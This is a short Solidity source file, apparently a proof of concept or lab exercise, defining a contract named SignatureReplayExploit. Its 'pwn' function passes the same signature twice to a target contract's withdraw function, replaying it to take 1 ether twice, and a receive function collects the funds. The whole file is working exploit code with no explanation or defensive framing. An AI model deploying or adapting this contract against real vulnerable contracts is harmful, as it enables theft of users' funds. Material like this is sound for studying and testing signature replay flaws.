// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ISignatureReplay {
    function withdraw(uint amount, bytes calldata sig) external;
}

contract SignatureReplayExploit {
    ISignatureReplay immutable target;

    constructor(address _target) {
        target = ISignatureReplay(_target);
    }

    receive() external payable {}

    function pwn(bytes calldata sig) external {
        target.withdraw(1 ether, sig);
        target.withdraw(1 ether, sig);
    }
}
